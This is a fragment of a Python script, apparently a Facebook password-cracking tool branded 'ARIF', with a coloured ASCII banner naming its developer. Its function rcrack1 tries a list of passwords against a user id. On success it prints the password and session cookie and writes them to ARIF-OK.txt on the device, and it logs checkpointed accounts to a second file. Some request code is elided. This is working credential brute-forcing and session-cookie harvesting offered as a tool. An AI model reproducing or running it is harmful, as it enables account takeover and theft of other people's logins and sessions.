...
#--------------------------(LOGO BOX)--------------------------#
logo =("""                                                
\x1b[38;5;46m           _____  _____ ______ 
\x1b[38;5;46m     /\   |  __ \|_   _|  ____|
    /  \  | |__) | | | | |__   
   / /\ \ |  _  /  | | |  __|  
  / ____ \| | \ \ _| |_| |     
 /_/    \_\_|  \_\_____|_|     
...
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mDeveloper \033[1;31m● \x1b[38;5;46mARIF AHMED SHANTO
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mFacebook  \033[1;31m● \x1b[38;5;46mARIF Ahmed
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mVersion  \033[1;31m ● \x1b[38;5;46m5.3
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sARIF\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print('\r\r\033[1;32m[ARIF-OK🙀] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\x1b[38;5;254mCOOKIE = \x1b[38;5;254m'+coki+ ' ''  \x1b[38;5;254m')
                open('/sdcard/ARIF-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
#              print(f"\x1b[38;5;196m[ARIF-CP💔] {uid}|{ps}")
                open('/sdcard/ARIF-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
